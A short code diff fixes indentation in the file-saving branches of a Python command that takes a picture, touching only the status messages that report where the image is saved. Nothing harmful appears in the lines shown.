@@ -49,14 +49,14 @@ class command:
 		except:
 		    h.info_error("Failed to take picture!")
 		    return
-                        if dest[-1:] == "/":
-                            h.info_general("Saving to "+dest+"picture.jpg...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"picture.jpg!")
-                         else:
-                            h.info_general("Saving to "+dest+"/picture.jpg...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"/picture.jpg!")
+                if dest[-1:] == "/":
+                    h.info_general("Saving to "+dest+"picture.jpg...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"picture.jpg!")
+                else:
+                    h.info_general("Saving to "+dest+"/picture.jpg...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"/picture.jpg!")
             else:
                 h.info_error("Local directory: "+dest+": does not exist!")
         else:
@@ -78,9 +78,9 @@ class command:
 		    except:
 		        h.info_error("Failed to take picture!")
 			return
-                            h.info_general("Saving to "+dest+"...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"!")
+                    h.info_general("Saving to "+dest+"...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"!")
                 else:
                     h.info_error("Error: "+rp+": not a directory!")
             else:
